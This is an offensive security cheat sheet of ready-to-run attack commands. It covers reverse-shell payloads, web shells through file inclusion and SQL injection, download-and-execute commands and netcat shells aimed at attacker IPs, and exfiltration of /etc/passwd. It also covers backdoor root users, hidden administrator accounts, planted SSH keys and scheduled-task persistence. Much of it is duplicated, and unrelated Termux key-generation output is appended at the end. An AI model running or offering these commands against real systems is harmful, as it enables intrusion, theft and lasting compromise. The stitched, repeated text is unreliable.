Cracking Common Protocols with Hydra
hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
HashCat Cracking
# Bruteforce based on the pattern;
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  

# Generate password candidates: wordlist + pattern;
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout

# Generate NetNLTMv2 with internalMonologue and crack with hashcat
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800

# resulting hash
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000

# crack with hashcat
hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable

Generating Payload with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai

Compiling Code From Linux
# Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

# Linux
gcc -m32|-m64 -o output source.c
Compiling Assembly from Windows
# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj

# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj

Local File Inclusion to Shell
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

# Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
Local File Inclusion: Reading Files
file:///etc/passwd

http://example.com/index.php?page=php://input&cmd=ls
    POST: <?php system($_GET['cmd']); ?>
http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
    POST: <?php system('uname -a');die(); ?>

expect://whoami
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id
http://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E

# ZIP Wrapper
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
http://example.com/index.php?page=zip://shell.jpg%23payload.php

# Loop through file descriptors
curl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -
Remote File Inclusion Shell: Windows + PHP
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
SQL Injection to Shell or Backdoor
# Assumed 3 columns
http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
# sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
# netcat reverse shell via mssql injection when xp_cmdshell is available
1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
SQLite Injection to Shell or Backdoor
ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; 
CREATE TABLE pwn.shell (code TEXT); 
INSERT INTO pwn.shell (code) VALUES ('<?php system($_REQUEST['cmd']);?>');
MS-SQL Console
mssqlclient.py -port 27900 user:password@10.1.1.1
sqsh -S 10.1.1.1 -U user -P password
Upgradig Non-Interactive Shell
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/busybox sh
Python Input Code Injection
__import__('os').system('id')
Local Enumeration & Privilege Escalation

Check AppLocker Policies
Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
Applocker: Writable Windows Directories
# list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
Find Writable Files/Folders in Windows
$a = Get-ChildItem "c:\windows\" -recurse -ErrorAction SilentlyContinue
$a | % {
    $fileName = $_.fullname
    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match "full|modify|write" -and $_.identityreference -match "authenticated users|everyone|$env:username"}
    if($acls -ne $null)
    {
        [pscustomobject]@{
            filename = $fileName
            user = $acls | select -exp identityreference
        }
    }
}
Check if Powershell Logging is Enabled
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
Check WinEvent Logs for SecureString Exposure
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'
Check WinEvent for Machine Wake/Sleep times
Get-WinEvent -FilterHashTable @{ ProviderName = 'Microsoft-Windows-Power-TroubleShooter'  ; Id = 1 }|Select-Object -Property @{n='Sleep';e={$_.Properties[0].Value}},@{n='Wake';e={$_.Properties[1].Value}}
Audit Policies
auditpol /get /category:*
Check if LSASS is running in PPL
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
Binary Exploitation with ImmunityDebugger
Get Loaded Modules
# We're interested in modules without protection, Read & Execute permissions
!mona modules
Finding JMP ESP Address
!mona find -s "\xFF\xE4" -m moduleName
Cracking a ZIP Password
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
Setting up Simple HTTP server
# Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
MySQL User Defined Fuction Privilge Escalation
Requires raptor_udf2.c and sid-shell.c or full raptor.tar:


gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/raptor_udf2.so'));
select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
Docker Privilege Esclation
echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
Resetting root Password
echo "root:spotless" | chpasswd
Uploading Files to Target Machine
TFTP
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
FTP
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
CertUtil
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
PHP
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
Python
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
HTTP: Powershell
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');

# download using default proxy credentials and launch
powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
HTTP: VBScript
Copy and paste contents of wget.vbs into a Windows Shell and then:
cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
HTTP: Linux
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
NetCat
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
HTTP: Windows "debug.exe" Method
# 1. In Linux, convert binary to hex ascii:
wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
# 2. Paste nc.txt into Windows Shell.
HTTP: Windows BitsAdmin
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
Wscript Script Code Download & Execution
echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
<?xml version="1.0"?>
<package>
<component id="PopCalc">
<script language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc"); 
    ]]>
</script>
</component>
</package>
Whois Data Exfiltration
# attacker
nc -l -v -p 43 | sed "s/ //g" | base64 -d
# victim
whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
Cancel Data Exfiltration
cancel -u "$(cat /etc/passwd)" -h ip:port
rlogin Data Exfiltration
rlogin -l "$(cat /etc/passwd)" -p port host
Bash Ping Sweeper
#!/bin/bash
for lastOctet in {1..254}; do 
    ping -c 1 10.0.0.$lastOctet | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done
Brute-forcing XOR'ed string with 1 byte key in Python
encrypted = "encrypted-string-here"
for i in range(0,255):
    print("".join([chr(ord(e) ^ i) for e in encrypted]))
Generating Bad Character Strings
# Python
'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])
# Bash
for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"
Converting Python to Windows Executable (.py -> .exe)
python pyinstaller.py --onefile convert-to-exe.py
Port Scanning with NetCat
nc -nvv -w 1 -z host 1000-2000
nc -nv -u -z -w 1 host 160-162
Port Scanning with Masscan
masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0
Exploiting Vulnerable Windows Services: Weak Service Permissions
# Look for SERVICE_ALL_ACCESS in the output
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
sc qc [service_name] (to verify!)
sc start [service_name]
Find File/Folder Permissions Explicitly Set for a Given User
icacls.exe C:\folder /findsid userName-or-*sid /t
//look for (F)ull, (M)odify, (W)rite
AlwaysInstallElevated MSI
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Stored Credentials: Windows
c:\unattend.xml
c:\sysprep.inf
c:\sysprep\sysprep.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
dir /s *cred* == *pass* == *.conf

# Windows Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Registry
reg query HKLM /f password /t REG_SZ /s 
reg query HKCU /f password /t REG_SZ /s
Unquoted Service Path
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """
Persistence via Services
# cmd
sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""

# powersehll
New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName "'C:\Program Files\NotEvil\back.exe'" -Description "Not at all"
Port Forwarding / SSH Tunneling
SSH: Local Port Forwarding
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
SSH: Dynamic Port Forwarding
# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@SSH_SERVER
SSH: Remote Port Forwarding
# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
Proxy Tunnel
# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555
HTTP Tunnel: SSH Over HTTP
# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80

# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
htc -F 8080 192.168.1.15:80

# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
ssh localhost -p 8080
Netsh - Windows Port Forwarding
# requires admin
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
RunAs / Start Process As
PowerShell
# Requires PSRemoting
$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }

# without PSRemoting
cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))

# without PS Remoting, with arguments
cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"
CMD
# Requires interactive console
runas /user:userName cmd.exe
PsExec
psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
Pth-WinExe
pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
Recursively Find Hidden Files: Windows
dir /A:H /s "c:\program files"
General File Search
# Query the local db for a quick file find. Run updatedb before executing locate.
locate passwd 

# Show which file would be executed in the current environment, depending on $PATH environment variable;
which nc wget curl php perl python netcat tftp telnet ftp

# Search for *.conf (case-insensitive) files recursively starting with /etc;
find /etc -iname *.conf
Post-Exploitation & Maintaining Access
Browsing Registry Hives
hivesh /registry/file
Decrypting RDG Passwords
Remote Desktop Connection Manager passwords can be decrypted on the same computer/account they were encrypted:
Copy-Item 'C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll’
Import-Module C:\temp\RDCMan.dll
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)
Decrypting VNC Password
wine vncpwdump.exe -k key
Creating User and Adding to Local Administrators
net user spotless spotless /add & net localgroup Administrators spotless /add
Hide Newly Created Local administrator
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f
Creating SSH Authorized Keys
mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
Creating Backdoor User w/o Password
echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd

# Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
Creating Another root User
useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
Generating OpenSSL Password
openssl passwd -1 password 
# output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.
Persistent Back Doors
# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
Code Execution / Application Whitelist Bypass
Ieframe.dll
rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
# Look for SERVICE_ALL_ACCESS in the output
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
sc qc [service_name] (to verify!)
sc start [service_name]

Find File/Folder Permissions Explicitly Set for a Given User
icacls.exe C:\folder /findsid userName-or-*sid /t
//look for (F)ull, (M)odify, (W)rite
AlwaysInstallElevated MSI
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Stored Credentials: Windows
c:\unattend.xml
c:\sysprep.inf
c:\sysprep\sysprep.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
dir /s *cred* == *pass* == *.conf

# Windows Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Registry
reg query HKLM /f password /t REG_SZ /s 
reg query HKCU /f password /t REG_SZ /s

Unquoted Service Path
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """

Persistence via Services
# cmd
sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""

# powersehll
New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName "'C:\Program Files\NotEvil\back.exe'" -Description "Not at all"

Port Forwarding / SSH Tunneling
SSH: Local Port Forwarding
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER

SSH: Dynamic Port Forwarding
# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@SSH_SERVER
SSH: Remote Port Forwarding
# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
Proxy Tunnel

# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128

# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555

HTTP Tunnel: SSH Over HTTP
# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80

# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
htc -F 8080 192.168.1.15:80

# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
ssh localhost -p 8080
Netsh - Windows Port Forwarding

# requires admin
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport

RunAs / Start Process As
PowerShell
# Requires PSRemoting
$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }

# without PSRemoting
cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))

# without PS Remoting, with arguments
cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"
CMD

# Requires interactive console
runas /user:userName cmd.exe
PsExec
psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
Pth-WinExe
pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe

Recursively Find Hidden Files: Windows
dir /A:H /s "c:\program files"

General File Search
# Query the local db for a quick file find. Run updatedb before executing locate.
locate passwd 

# Show which file would be executed in the current environment, depending on $PATH environment variable;
which nc wget curl php perl python netcat tftp telnet ftp

# Search for *.conf (case-insensitive) files recursively starting with /etc;
find /etc -iname *.conf

Post-Exploitation & Maintaining Access
Browsing Registry Hives
hivesh /registry/file
Decrypting RDG Passwords
Remote Desktop Connection Manager passwords can be decrypted on the same computer/account they were encrypted:
Copy-Item 'C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll’
Import-Module C:\temp\RDCMan.dll
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)
Decrypting VNC Password
wine vncpwdump.exe -k key
Creating User and Adding to Local Administrators
net user spotless spotless /add & net localgroup Administrators spotless /add
Hide Newly Created Local administrator
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f
Creating SSH Authorized Keys
mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
Creating Backdoor User w/o Password
echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
# Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
Creating Another root User
useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
Generating OpenSSL Password
openssl passwd -1 password 
# output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.
Persistent Back Doors
# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
Code Execution / Application Whitelist Bypass
Ieframe.dll
rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url







Public key portion is:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCQPL5QdgGOVYT3PaCfVwaIDGzXyfYKEhEZoI2/hKoLrhWdGKGnBuofvg9PFBRSuUYeLyDJ7wKqScbcKjbzb2DwudOHjDpcjf2NceBdT2XNOgmI886+zPYddXIHVgPqZQ8Tg9q1v/LZxX5oJppfa0TUbF444KVPil4emLq8zO0HWZu6JIhaB5Ou1+kppJon6XaYbhrHBk8mJ1h2AQzH9wiao7DD0j3+rwvB95Do7ourcxcy90cAyr/GqL0x9SKzfb8lfoYN+qOUCo3olg0U4ayFwgqrYDJ6tYv/t6spYT3vXrrtTtyyKcNm2lyhM6DZpbMPlNCwF3baMFT3rv6gUUzP u0_a361@localhost
Fingerprint: SHA256:qDqvVy9xJzHxPAFi/81jsWycwSYxZNMdCR+niSOem2A
Generating 256 bit ecdsa key, this may take a while...
Public key portion is:
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKZXAKCV9m8XiwsKsdsRVlX5WHiTzunmcM+UM8EmdJkSJc1l3h0KIl02XjkESAD8fgzl9Ik2iQyTGcI2234BMSU= u0_a361@localhost
Fingerprint: SHA256:XuCa68NXGI3ZFHmc6Rp512KgtKx4me9ENBhESfBcKOQ
Generating 256 bit ed25519 key, this may take a while...
Public key portion is:
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA/bCfrSU0E0UIYzLYmAJDO/h6IS+0XlXaq/S+VPXWl5 u0_a361@localhost
Fingerprint: SHA256:mqUUAT22iTgVwhPp+tN09CgWGb77xSOHP5fUNWCZFZc

DROPBEAR / CLI INSTALLED


Termux Variables:
TERMUX_API_VERSION=0.50.1
TERMUX_APK_RELEASE=F_DROID
TERMUX_APP_PACKAGE_MANAGER=apt
TERMUX_APP_PID=30684
TERMUX_IS_DEBUGGABLE_BUILD=0
TERMUX_MAIN_PACKAGE_FORMAT=debian
TERMUX_VERSION=0.118.0
